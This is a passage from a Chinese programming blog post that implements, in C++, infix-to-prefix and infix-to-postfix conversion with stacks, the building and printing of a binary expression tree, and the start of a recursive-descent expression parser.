class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">NiToPre</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Token&gt; &amp;nifix, <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Token&gt; &amp;pre)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="built_in">std</span>::<span class="built_in">stack</span>&lt;Token&gt; stk;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> it = nifix.rbegin(); it != nifix.rend(); ++it)</div><div class="line">    <span class="comment">// 从后往前读取</span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">auto</span> i = *it;</div><div class="line">        <span class="keyword">if</span> (i._type == OP_NUM)</div><div class="line">        &#123;</div><div class="line">            pre.push_back(i);</div><div class="line">        &#125;   <span class="comment">// 操作数直接输出</span></div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">auto</span> iv = i._value;</div><div class="line">            <span class="keyword">if</span> (iv == OP_RBAC)</div><div class="line">            &#123;</div><div class="line">                stk.push(i);</div><div class="line">            &#125;   <span class="comment">// 右括号直接入栈</span></div><div class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (iv == OP_LBAC)</div><div class="line">            &#123;</div><div class="line">                <span class="keyword">while</span> (stk.top()._value != OP_RBAC)</div><div class="line">                &#123;</div><div class="line">                    pre.push_back(stk.top());</div><div class="line">                    stk.pop();</div><div class="line">                &#125;</div><div class="line">                stk.pop();</div><div class="line">            &#125;   <span class="comment">// 左括号，pop到右括号</span></div><div class="line">            <span class="keyword">else</span></div><div class="line">            &#123;</div><div class="line">                <span class="keyword">while</span> (!stk.empty() &amp;&amp; stk.top()._value != OP_RBAC &amp;&amp; CalcPriority(i) &lt; CalcPriority(stk.top()))</div><div class="line">                &#123;</div><div class="line">                    pre.push_back(stk.top());</div><div class="line">                    stk.pop();</div><div class="line">                &#125;</div><div class="line">                stk.push(i);</div><div class="line">            &#125;   <span class="comment">// 遇到操作符，把小于它优先级的操作符都出栈，直到左括号或者栈空，最后让它入栈</span></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">while</span> (!stk.empty())</div><div class="line">    &#123;</div><div class="line">        pre.push_back(stk.top());</div><div class="line">        stk.pop();</div><div class="line">    &#125;   <span class="comment">// 读取完表达式，将栈全部pop</span></div><div class="line"></div><div class="line">    reverse(pre.begin(), pre.end());    <span class="comment">// 最后逆序输出</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p><img src="/images/prepost/0.png" alt="0"></p>
<hr>
<h1 id="平凡二叉树实现"><a href="#平凡二叉树实现" class="headerlink" title="平凡二叉树实现"></a>平凡二叉树实现</h1><p>如果构造一棵语法树，那就想输出什么缀就输出什么缀，无非就是前序遍历和后序遍历。<br>像这样：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">PreTrav</span><span class="params">(Node *&amp;Node)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">if</span> (Node-&gt;left == <span class="literal">nullptr</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; Node-&gt;token._value &lt;&lt; <span class="string">' '</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; OpToChar(Node-&gt;token._value) &lt;&lt; <span class="string">' '</span>;</div><div class="line">        PreTrav(Node-&gt;left);</div><div class="line">        PreTrav(Node-&gt;right);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">PostTrav</span><span class="params">(Node *&amp;Node)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">if</span> (Node-&gt;left == <span class="literal">nullptr</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; Node-&gt;token._value &lt;&lt; <span class="string">' '</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        PostTrav(Node-&gt;left);</div><div class="line">        PostTrav(Node-&gt;right);</div><div class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; OpToChar(Node-&gt;token._value) &lt;&lt; <span class="string">' '</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>终端输出：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">后序遍历：7 6 - 5 4 3 / + + 2 1 * -</div><div class="line">前序遍历：- + - 7 6 + 5 / 4 3 * 2 1</div></pre></td></tr></table></figure></p>
<p>甚至可以画一棵二叉树：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">output_impl</span><span class="params">(Node *n, <span class="keyword">bool</span> left, <span class="built_in">std</span>::<span class="built_in">string</span> <span class="keyword">const</span> &amp;indent)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">if</span> (n-&gt;right)</div><div class="line">    &#123;</div><div class="line">        output_impl(n-&gt;right, <span class="literal">false</span>, indent + (left ? <span class="string">"|     "</span> : <span class="string">"      "</span>));</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; indent;</div><div class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; (left ? <span class="string">'`'</span> : <span class="string">'.'</span>);</div><div class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"--- "</span>;</div><div class="line">    <span class="keyword">if</span> (n-&gt;token._type == OP_NUM)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; n-&gt;token._value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; OpToChar(n-&gt;token._value) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (n-&gt;left)</div><div class="line">    &#123;</div><div class="line">        output_impl(n-&gt;left, <span class="literal">true</span>, indent + (left ? <span class="string">"      "</span> : <span class="string">"|     "</span>));</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">output</span><span class="params">(Node *root)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">if</span> (root-&gt;right)</div><div class="line">    &#123;</div><div class="line">        output_impl(root-&gt;right, <span class="literal">false</span>, <span class="string">""</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (root-&gt;token._type == OP_NUM)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; root-&gt;token._value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; OpToChar(root-&gt;token._value) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (root-&gt;left)</div><div class="line">    &#123;</div><div class="line">        output_impl(root-&gt;left, <span class="literal">true</span>, <span class="string">""</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>终端输出：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">      .--- 1</div><div class="line">.--- *</div><div class="line">|     `--- 2</div><div class="line">-</div><div class="line">|                 .--- 3</div><div class="line">|           .--- /</div><div class="line">|           |     `--- 4</div><div class="line">|     .--- +</div><div class="line">|     |     `--- 5</div><div class="line">`--- +</div><div class="line">      |     .--- 6</div><div class="line">      `--- -</div><div class="line">            `--- 7</div></pre></td></tr></table></figure></p>
<h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>为什么又叫作平凡实现呢，因为这种实现在构造二叉树的时候，本质上和栈实现没太大差别，还是根据优先级进行入栈出栈。</p>
<h3 id="主要代码-2"><a href="#主要代码-2" class="headerlink" title="主要代码"></a>主要代码</h3><p>数据结构：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></div><div class="line"><span class="class">&#123;</span></div><div class="line">    Token token;</div><div class="line">    Node *left = <span class="literal">nullptr</span>;</div><div class="line">    Node *right = <span class="literal">nullptr</span>;</div><div class="line">    Node(<span class="keyword">const</span> Token &amp;t) : token(t) &#123;&#125;</div><div class="line">    Node(<span class="keyword">const</span> Token &amp;t, Node *l, Node *r) : token(t), left(l), right(r) &#123;&#125;</div><div class="line">    ~Node()</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">delete</span> left;</div><div class="line">        <span class="keyword">delete</span> right;</div><div class="line">    &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>实现代码：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">NiToBitree</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Token&gt; &amp;nifix, Node *&amp;Tree)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="built_in">std</span>::<span class="built_in">stack</span>&lt;Node *&gt; branch;</div><div class="line">    <span class="built_in">std</span>::<span class="built_in">stack</span>&lt;Token&gt; op;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span> &amp;i : nifix)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (i._type == OP_NUM)</div><div class="line">        &#123;</div><div class="line">            branch.push(<span class="keyword">new</span> Node(i));</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">auto</span> iv = i._value;</div><div class="line">            <span class="keyword">if</span> (iv == OP_LBAC)</div><div class="line">            &#123;</div><div class="line">                op.push(i);</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (iv == OP_RBAC)</div><div class="line">            &#123;</div><div class="line">                <span class="keyword">while</span> (op.top()._value != OP_LBAC)</div><div class="line">                &#123;</div><div class="line">                    <span class="keyword">auto</span> r = branch.top();</div><div class="line">                    branch.pop();</div><div class="line">                    <span class="keyword">auto</span> l = branch.top();</div><div class="line">                    branch.pop();</div><div class="line">                    branch.push(<span class="keyword">new</span> Node(op.top(), l, r));</div><div class="line">                    op.pop();</div><div class="line">                &#125;</div><div class="line">                op.pop();</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span></div><div class="line">            &#123;</div><div class="line">                <span class="keyword">while</span> (!op.empty() &amp;&amp; op.top()._value != OP_LBAC &amp;&amp; CalcPriority(i) &lt;= CalcPriority(op.top()))</div><div class="line">                &#123;</div><div class="line">                    <span class="keyword">auto</span> r = branch.top();</div><div class="line">                    branch.pop();</div><div class="line">                    <span class="keyword">auto</span> l = branch.top();</div><div class="line">                    branch.pop();</div><div class="line">                    branch.push(<span class="keyword">new</span> Node(op.top(), l, r));</div><div class="line">                    op.pop();</div><div class="line">                &#125;</div><div class="line">                op.push(i);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">while</span> (!op.empty())</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">auto</span> r = branch.top();</div><div class="line">        branch.pop();</div><div class="line">        <span class="keyword">auto</span> l = branch.top();</div><div class="line">        branch.pop();</div><div class="line">        branch.push(<span class="keyword">new</span> Node(op.top(), l, r));</div><div class="line">        op.pop();</div><div class="line">    &#125;</div><div class="line">    Tree = branch.top();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<hr>
<h1 id="优雅实现之语法分析器"><a href="#优雅实现之语法分析器" class="headerlink" title="优雅实现之语法分析器"></a>优雅实现之语法分析器</h1><p>我实在是不满足平凡实现，觉得它太实在了，老老实实总会遭人欺负的。于是我对着这四则运算表达式圈圈画画，没想到还真看出来了端倪。然后赶紧上搜索引擎看看有没同道中人已经实现过这种思路，果然……轮子哥在八年前，也就是在我还是小学生的时候，就已经实现过了……好吧，下面一起来看看。</p>
<hr>
<h2 id="单位化"><a href="#单位化" class="headerlink" title="单位化"></a>单位化</h2><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><p>一个表达式，可以看成是若干个单位通过<code>&#39;+&#39;</code>, <code>&#39;-&#39;</code>连接起来，比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1 + 2            // 单位：1, 2</div><div class="line">3                // 单位：3</div><div class="line">5 + (4 - 2) * 3  // 单位：5, (4 - 2) * 3</div><div class="line">6 * 4 - 3        // 单位：6 * 4, 3</div></pre></td></tr></table></figure></p>
<p>我们把这种单位抽象出来，取个名字：<strong>Factor</strong>。</p>
<p>因此，表达式可以这样来表示： <code>Exp = Factor (( &#39;+&#39; | &#39;-&#39; ) Factor)*</code>，十分的简洁明了。</p>
<h3 id="Factor"><a href="#Factor" class="headerlink" title="Factor"></a>Factor</h3><p>接下来Factor也不难表示，可以看成是若干个单位通过<code>&#39;*&#39;</code>, <code>&#39;/&#39;</code>连接起来，比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1 * 2       // 单位：1, 2</div><div class="line">(4 - 2) * 3 // 单位：(4 - 2), 3</div><div class="line">5 / 4 * 6   // 单位：5, 4, 6</div></pre></td></tr></table></figure></p>
<p>我们把这种单位抽象出来，取个名字：<strong>Term</strong>。</p>
<p>因此，Factor可以这样来表示：<code>Factor = Term (( &#39;*&#39; | &#39;/&#39; ) Term)*</code></p>
<h3 id="Term"><a href="#Term" class="headerlink" title="Term"></a>Term</h3><p>最后就是最基本的单位Term，通过观察可知Term要么是数字，要么是括号括起来的一个表达式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">50          --&gt; Term</div><div class="line">(4 - 2)     --&gt; Term</div></pre></td></tr></table></figure></p>
<p>因此Term可以这样来表示：<code>Term = &lt;数字&gt; | &#39;(&#39; Exp &#39;)&#39;</code></p>
<p>我们可以通过上面的关系来构造语法树，可以想象，生成过程真的很像一棵树的生长。</p>
<p>没错！我就是想要这种非常函数式的实现，这种抽象美得让人陶醉。鲁迅先生好像说过：</p>
<blockquote>
<p>Any problem in computer science can be solved with another level of indirection.<br>计算机科学里面，没有什么问题是多加一层抽象不可以解决的。</p>
</blockquote>
<hr>
<h2 id="语法树特点"><a href="#语法树特点" class="headerlink" title="语法树特点"></a>语法树特点</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">      .--- 1</div><div class="line">.--- *</div><div class="line">|     `--- 2</div><div class="line">-</div><div class="line">|                 .--- 3</div><div class="line">|           .--- /</div><div class="line">|           |     `--- 4</div><div class="line">|     .--- +</div><div class="line">|     |     `--- 5</div><div class="line">`--- +</div><div class="line">      |     .--- 6</div><div class="line">      `--- -</div><div class="line">            `--- 7</div></pre></td></tr></table></figure>
<p>借用上边画出来的语法树，来观察语法树的结构：</p>
<ul>
<li>一个数字表达式的节点一定是一个叶子节点，没有左右孩子节点。</li>
<li>一个二元运算表达式一定有两个孩子节点，因为二元运算符号左右两边必然都要有表达式。这两个叶子节点的类型，是抽象的表达式，既可以是二元运算表达式，也可以是数字表达式。</li>
</ul>
<p>由此可以定义<code>Expression</code>作为基类，派生出<code>NumberExpression</code>类和<code>BinaryExpression</code>类，来表示数字表达式和二元运算表达式。<br><img src="/images/prepost/1.jpg" alt="1"></p>
<blockquote>
<p>注：下面都是用现代C++来实现，区别于轮子哥八年前写的古老C++版。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Expression</span></span></div><div class="line"><span class="class">&#123;</span></div><div class="line">  <span class="keyword">public</span>:</div><div class="line">    <span class="keyword">virtual</span> ~Expression() = <span class="keyword">default</span>;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">NumberExpression</span> :</span> <span class="keyword">public</span> Expression</div><div class="line">&#123;</div><div class="line">  <span class="keyword">public</span>:</div><div class="line">    <span class="keyword">int</span> Value;</div><div class="line">    NumberExpression(<span class="keyword">int</span> number) : Value(number) &#123;&#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">BinaryExpression</span> :</span> <span class="keyword">public</span> Expression</div><div class="line">&#123;</div><div class="line">  <span class="keyword">public</span>:</div><div class="line">    <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;Expression&gt; First;</div><div class="line">    <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;Expression&gt; Second;</div><div class="line">    BinaryOperator Op;</div><div class="line">    BinaryExpression(BinaryOperator theOp, <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;Expression&gt; theLeft, <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;Expression&gt; theRight) : Op(theOp), First(theLeft), Second(theRight) &#123;&#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p><code>BinaryOperator</code>枚举类型也要现代一点：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">enum</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryOperator</span></span></div><div class="line"><span class="class">&#123;</span></div><div class="line">    Plus,</div><div class="line">    Minus,</div><div class="line">    Multiply,</div><div class="line">    Divide,</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<hr>
<h2 id="构造语法树"><a href="#构造语法树" class="headerlink" title="构造语法树"></a>构造语法树</h2><h3 id="辅助函数"><a href="#辅助函数" class="headerlink" title="辅助函数"></a>辅助函数</h3><h4 id="Is"><a href="#Is" class="headerlink" title="Is"></a>Is</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Is</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *&amp;Stream, <span class="keyword">const</span> <span class="keyword">char</span> *Text)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">size_t</span> len = <span class="built_in">strlen</span>(Text);</div><div class="line">    <span class="comment">/*保存参数*/</span></div><div class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *Read = Stream;</div><div class="line">    <span class="comment">/*过滤空格*/</span></div><div class="line">    <span class="keyword">while</span> (*Read == <span class="string">' '</span>)</div><div class="line">        Read++;</div><div class="line">    <span class="keyword">if</span> (<span class="built_in">strncmp</span>(Read, Text, len) == <span class="number">0</span>)</div><div class="line">    &#123;</div><div class="line">        Stream = Read + len;</div><div class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>用于判断Stream是不是由Text开头，如果是就将Stream偏移strlen(Text)个字符。</p>
<h4 id="GetNumber"><a href="#GetNumber" class="headerlink" title="GetNumber"></a>GetNumber</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;Expression&gt; GetNumber(<span class="keyword">const</span> <span class="keyword">char</span> *&amp;Stream)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> Result = <span class="number">0</span>;</div><div class="line">    <span class="keyword">bool</span> GotNumber = <span class="literal">false</span>;</div><div class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *Read = Stream;</div><div class="line">    <span class="keyword">while</span> (*Read == <span class="string">' '</span>)</div><div class="line">        Read++;</div><div class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">char</span> c = *Read;</div><div class="line">        <span class="keyword">if</span> (<span class="string">'0'</span> &lt;= c &amp;&amp; c &lt;= <span class="string">'9'</span>)</div><div class="line">        &#123;</div><div class="line">            Result = Result * <span class="number">10</span> + (c - <span class="string">'0'</span>);</div><div class="line">            GotNumber = <span class="literal">true</span>;</div><div class="line">            Read++;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (GotNumber)</div><div class="line">    &#123;</div><div class="line">        Stream = Read;</div><div class="line">        <span class="keyword">return</span> <span class="built_in">std</span>::make_shared&lt;NumberExpression&gt;(Result);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">throw</span> Exception(Stream, <span class="string">"此处需要表达式"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<blockquote>
<p>这个函数的作用是，按照数字的方式，对Stream进行解析，如果解析成功，就将Stream指针的位置移动到解析完成的最后位置（代码中的Read），然后调用make_shared，构造一个shared_ptr并返回；而如果失败（即一个数字都没找到），则抛出一个异常。跟Is一样，这个函数会过滤掉开头的空格。</p>
</blockquote>
<hr>
<h3 id="辅助异常类"><a href="#辅助异常类" class="headerlink" title="辅助异常类"></a>辅助异常类</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Exception</span></span></div><div class="line"><span class="class">&#123;</span></div><div class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *Start;</div><div class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *Error;</div><div class="line">    Exception(<span class="keyword">const</span> <span class="keyword">char</span> *aStart, <span class="keyword">const</span> <span class="keyword">char</span> *aError)</div><div class="line">    &#123;</div><div class="line">        Start = aStart;</div><div class="line">        Error = aError;</div><div class="line">    &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<hr>
<h3 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;Expression&gt; GetTerm(<span class="keyword">const</span> <span class="keyword">char</span> *&amp;Stream);</div><div class="line"><span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;Expression&gt; GetFactor(<span class="keyword">const</span> <span class="keyword">char</span> *&amp;Stream);</div><div class="line"><span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;Expression&gt; GetExp(<span class="keyword">const</span> <span class="keyword">char</span> *&amp;Stream);</div></pre></td></tr></table></figure>
<p>三个解析函数，完成语法树的构造。</p>
<h4 id="GetExp"><a href="#GetExp" class="headerlink" title="GetExp"></a>GetExp</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;Expression&gt; GetExp(<span class="keyword">const</span> <span class="keyword">char</span> *&amp;Stream)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *Read = Stream;</div><div class="line">    <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;Expression&gt; Result = GetFactor(Read);</div><div class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</div><div class="line">    &#123;</div><div 